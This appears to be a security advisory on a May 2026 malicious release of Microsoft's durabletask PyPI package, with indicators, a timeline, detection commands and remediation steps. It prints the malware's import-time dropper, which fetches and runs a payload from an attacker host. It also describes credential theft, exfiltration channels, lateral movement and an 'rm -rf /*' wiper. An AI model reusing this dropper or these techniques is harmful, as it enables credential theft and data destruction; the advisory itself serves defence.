# Microsoft durabletask PyPI Compromise — TeamPCP rope.pyz Modular Cloud Intrusion Framework

**Date:** May 2026
**Ecosystem:** PyPI
**Severity:** Critical
**Type:** Account Takeover / Credential Stealer / Lateral Movement / Destructive Wiper
**Sources:**
- [StepSecurity — Microsoft's durabletask PyPI Package Compromised in Supply Chain Attack](https://www.stepsecurity.io/blog/microsofts-durabletask-pypi-package-compromised-in-supply-chain-attack)
- [Aikido — Microsoft's durabletask package on PyPi Compromised. Mini Shai Hulud attacks again... again!](https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud)
- [Wiz — durabletask: TeamPCP's Latest PyPi Compromise](https://www.wiz.io/blog/durabletask-teampcp-supply-chain-attack)

---

## Summary

On May 19, 2026, Microsoft's `durabletask` Python SDK — the official SDK for Azure Durable Functions with over 400,000 monthly downloads — was compromised on PyPI. Three malicious versions (1.4.1, 1.4.2, and 1.4.3) were uploaded directly to PyPI within a 35-minute window, completely bypassing the project's GitHub-hosted CI/CD pipeline. None of the malicious versions have corresponding tags, releases, or workflow runs in Microsoft's GitHub repository. The attacker compromised a real PyPI publishing token or maintainer account and uploaded directly. Microsoft confirmed the compromise and yanked all three affected versions.

The attack is attributed to the TeamPCP threat group — the same actor behind the Mini Shai-Hulud campaign, TanStack, Mistral AI, LiteLLM, @antv, Telnyx, and Checkmarx compromises. Attribution is anchored on the secondary C2 domain `t.m-kosche[.]com`, a known TeamPCP indicator confirmed across multiple prior incidents. The attack pre-staged its infrastructure three days before execution: the primary C2 domain `git-service.com` was registered on May 16, 2026, with TLS certificates issued the same day.

The 14-line dropper in `__init__.py` is deceptively simple but triggers `rope.pyz` — a 28 KB Python zipapp containing 17 source files organized as a modular cloud intrusion framework. The framework targets every major cloud provider (AWS, Azure, GCP, Kubernetes, HashiCorp Vault), runs seven credential collectors in parallel, propagates laterally via AWS SSM and Kubernetes `kubectl exec`, and for systems in specific geographies rolls a 1-in-6 dice for a destructive `rm -rf /*` wiper. The payload includes Russian folklore-themed GitHub repository names for exfiltration dead-drops and skips systems with a Russian locale — consistent with Eastern European cybercrime tradecraft.

---

## Compromised Artifacts

| Package | Malicious Version | Infection Scope | SHA-256 (wheel) |
|---------|-----------------|-----------------|-----------------|
| `durabletask` | 1.4.1 | `__init__.py` | `7d80b3ef74ad7992b93c31966962612e4e2ceb93e7727cdbd1d2a9af47d44ba8` |
| `durabletask` | 1.4.2 | `__init__.py`, `task.py` | `aeaf583e20347bf850e2fabdcd6f4982996ba023f8c2cd56bbd299cfd56516f5` |
| `durabletask` | 1.4.3 | `__init__.py`, `task.py`, `entities/__init__.py`, `extensions/__init__.py`, `payload/__init__.py` | `877ff2531a63393c4cb9c3c86908b62d9c4fc3db971bc231c48537faae6cb3ec` |
| `rope.pyz` (payload) | — | Downloaded at runtime | `069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce` |

Last clean version: `durabletask==1.4.0`

---

## How It Worked

### Entry Point: Import-Time Dropper (14 Lines)

The attacker replaced Microsoft's copyright header in `__init__.py` with a dropper that fires the moment any code runs `import durabletask`:

```python
import os, sys, platform, subprocess, urllib.request

if platform.system() == "Linux":
    try:
        urllib.request.urlretrieve(
            "https://check.git-service.com/rope.pyz",
            "/tmp/managed.pyz"
        )
        with open(os.devnull, 'w') as f:
            subprocess.Popen(
                ["python3", "/tmp/managed.pyz"],
                stdout=f, stderr=f, stdin=f,
                start_new_session=True
            )
    except:
        pass
```

Linux-only targeting, fully detached process (`start_new_session=True`), all I/O to `/dev/null`, bare `except: pass` — no error messages, no stack traces. The attacker escalated infection scope across versions, adding more module files in each release to ensure execution regardless of which submodule is imported first.

### Anti-Analysis Gate

Before running collectors, `rope.pyz` validates: Linux only, no Russian locale (`LANG` starting with `ru`), CPU count > 2. It also silently installs the `cryptography` package at runtime using `--break-system-packages` to bypass PEP 668 on newer distros.

### Credential Collectors (7 in parallel via ThreadPoolExecutor)

| Module | Targets |
|--------|---------|
| `collectors/aws.py` | Env vars, EC2 IMDSv2, `~/.aws/credentials`; enumerates Secrets Manager and SSM Parameter Store across 19 regions |
| `collectors/azure.py` | Client secret, certificate JWT, Azure CLI token cache, managed identity IMDS; dumps all Key Vault secrets |
| `collectors/gcp.py` | Service account JSON keys, metadata server; dumps all Secret Manager secrets |
| `collectors/kubernetes.py` | Parses kubeconfig, uses `memfd_create()` for mTLS certs (no disk writes); dumps all K8s secrets across all namespaces; auto-downloads `kubectl` if missing |
| `collectors/filesystem.py` | 99 hardcoded paths: cloud configs, SSH material, Git local files, package-manager config files, Terraform state, `.env` files, Docker socket, shell history, VPN configs, **Claude Desktop** and **Cursor MCP** configs |
| `collectors/passwords.py` | Targets 1Password, Bitwarden, `pass`, `gopass`; attempts brute-force unlock using candidate passwords from env vars and shell history |
| `collectors/vault.py` | `VAULT_TOKEN`, `~/.vault-token`, AppRole login; walks all KV mounts |

### Encryption and Exfiltration

All data is gzip-compressed, AES-256-GCM encrypted with a random key, and the key is RSA-OAEP wrapped with an attacker-hardcoded RSA-4096 public key. Three exfil channels, any one sufficient:

1. **Primary HTTPS**: POST to `https://check.git-service[.]com/api/public/version`
2. **GitHub dead-drop**: Searches commits for FIRESCALE beacons with RSA-signed C2 update URLs
3. **Tertiary — victim's own GitHub tokens**: Creates public repos with Russian folklore names (`BABA-YAGA`, `KOSCHEI`, `FIREBIRD`, `VASSILISA`, `RUSALKA`) and uploads encrypted bundles there

### Lateral Movement

- **AWS SSM**: Uses `SendCommand` with `AWS-RunShellScript` to execute `rope.pyz` on up to 5 other EC2 instances per profile; falls back to `t.m-kosche[.]com` as secondary download
- **Kubernetes**: Lists all pods, runs `kubectl exec` to drop and execute `rope.pyz` in up to 5 pods; uses `~/.cache/.sys-update-check` and `~/.cache/.sys-update-check-k8s` marker files to avoid re-infecting

### Persistence

Installs a fake systemd service `pgsql-monitor.service` (PostgreSQL monitoring decoy) via `systemctl --user daemon-reload`, runs at boot.

### Destructive Wiper (roulette.py)

Checks system timezone (`TZ`, `/etc/timezone`, `/etc/localtime`) and locale for Israeli markers (`Jerusalem`, `Tel_Aviv`, `he_IL`) or Iranian markers (`Tehran`, `fa_IR`). If matched, rolls `random.randint(1, 6)`: on a result of 2, plays audio from the C2 server at maximum volume then executes `rm -rf /*`.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Apr 8, 2026 18:49 | `durabletask` 1.4.0 published (last clean release) |
| May 16, 2026 01:31 | `rope.pyz` core modules authored |
| May 16, 2026 18:44 | `git-service.com` registered via NameSilo |
| May 16, 2026 18:58 | TLS certificate issued for `check.git-service.com` |
| May 19, 2026 16:19 | `durabletask` 1.4.1 uploaded to PyPI (1 file infected) |
| May 19, 2026 16:47 | Amazon Inspector publishes advisory MAL-2026-4174 |
| May 19, 2026 16:49 | `durabletask` 1.4.2 uploaded (2 files infected) |
| May 19, 2026 16:54 | `durabletask` 1.4.3 uploaded (5 files infected) |
| May 19, 2026 17:54 | GitHub Issue #137 filed reporting the compromise |
| May 19, 2026 18:04 | Microsoft confirms packages yanked |

---

## Detection

```bash
# Check installed version
pip show durabletask | grep Version
# Affected if Version is 1.4.1, 1.4.2, or 1.4.3

# Check for payload on disk
ls -la /tmp/managed.pyz

# Check for persistence service
systemctl --user status pgsql-monitor.service
ls ~/.config/systemd/user/pgsql-monitor.service

# Check for anti-reinfection markers
ls ~/.cache/.sys-update-check
ls ~/.cache/.sys-update-check-k8s

# Check for payload binary
ls ~/.local/bin/pgmonitor.py
ls /usr/bin/pgmonitor.py

# Check network logs for C2 traffic
# Look for connections to: check.git-service.com, t.m-kosche.com
# Look for GitHub repos with names matching: BABA-YAGA, KOSCHEI, FIREBIRD, VASSILISA, RUSALKA

# Check for running payload processes
ps aux | grep managed.pyz

# Verify clean hash of durabletask wheel (if pinning 1.4.0)
pip download durabletask==1.4.0 --no-deps -d /tmp/dt-check
sha256sum /tmp/dt-check/durabletask-1.4.0*.whl
```

---

## Remediation

1. **Isolate the system** — do not just uninstall the package; the payload runs as a detached process and persists via systemd
2. **Pin to last clean version**: `pip install durabletask==1.4.0`
3. **Remove persistence**:
   ```bash
   systemctl --user stop pgsql-monitor.service
   systemctl --user disable pgsql-monitor.service
   rm -f ~/.config/systemd/user/pgsql-monitor.service
   systemctl --user daemon-reload
   rm -f /tmp/managed.pyz
   rm -f ~/.cache/.sys-update-check ~/.cache/.sys-update-check-k8s
   ```
4. **Rotate all credentials** accessible from the system: AWS keys, Azure service principals, GCP service accounts, Kubernetes secrets, SSH keys, GitHub tokens, Vault tokens, database passwords, npm/PyPI tokens, secrets in environment variables
5. **Check network logs** for connections to `check.git-service.com` and `t.m-kosche.com`
6. **Audit cloud resources** for unauthorized access — review CloudTrail, Azure Activity Log, GCP Audit Log
7. **Inspect other pods/instances** for signs of lateral movement (SSM command history, `kubectl` exec logs)
8. **Use PyPI Trusted Publishing** (OIDC) instead of long-lived API tokens for future package publishing
9. **Pin package versions** with hash verification: `pip install --require-hashes`

---

## Lessons Learned

- PyPI Trusted Publishing (OIDC) would have prevented this attack entirely — direct token-based uploads from outside CI/CD pipelines are the attack vector
- Pre-staging infrastructure (registering domains days before) is a common TeamPCP pattern; monitoring newly registered domains resolving to C2 IPs can provide early warning
- Import-time execution in `__init__.py` is stealthier than `postinstall` hooks — it fires on any `import`, not just during `pip install`, and bypasses tooling that only checks scripts fields
- The escalating infection across versions (1, 2, then 5 files) shows the attacker iterating in production to maximize trigger reliability
- Using the victim's own GitHub tokens to exfiltrate via their own repositories is a particularly insidious technique — it turns the victim's trusted infrastructure against them
- The `rm -rf /*` wiper with a geopolitical targeting filter reflects a threat actor using criminal tools for hacktivist or state-adjacent objectives

---

## Related Incidents

- [./2026-05-antv-npm-shai-hulud.md](./2026-05-antv-npm-shai-hulud.md) — Simultaneous TeamPCP wave against @antv npm packages
- [./2026-05-mini-shai-hulud-tanstack-npm.md](./2026-05-mini-shai-hulud-tanstack-npm.md) — Prior TeamPCP TanStack wave
- [./2026-04-lightning-pypi-shai-hulud.md](./2026-04-lightning-pypi-shai-hulud.md) — TeamPCP PyPI compromise of PyTorch Lightning
- [./2026-03-litellm-pypi-stealer.md](./2026-03-litellm-pypi-stealer.md) — TeamPCP litellm PyPI attack
- [./2026-03-telnyx-pypi-wav.md](./2026-03-telnyx-pypi-wav.md) — TeamPCP Telnyx PyPI attack
